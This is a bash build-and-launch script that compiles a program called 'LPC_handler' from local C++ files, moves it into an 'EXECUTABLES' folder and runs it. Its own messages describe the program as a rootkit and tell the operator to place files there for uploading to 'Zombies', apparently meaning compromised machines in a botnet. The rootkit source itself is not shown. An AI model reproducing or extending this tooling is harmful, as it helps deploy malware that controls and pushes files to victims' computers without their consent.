#!/bin/bash

CPP=`ls *.cpp`
EXE="LPC_handler"
FOLDER="EXECUTABLES"

echo "[*] Building $EXE ..."
g++ -pthread $CPP -o $EXE -v -std=c++11
echo "[*] Done" 
if [ -f $EXE ];then
	clear
	echo "[*] Building successfull"
	if [ ! -d $FOLDER ];then
		echo "[*] Creating the folder : $FOLDER .."
		mkdir $FOLDER
	fi
	echo "[!] If you want to upload files on Zombies, put them in : $FOLDER"
	chmod +w $FOLDER
	mv $EXE $FOLDER/
	echo "[*] Starting the rootkit .."
	./$FOLDER/$EXE			
else
	echo "[X] Build failed"
fi

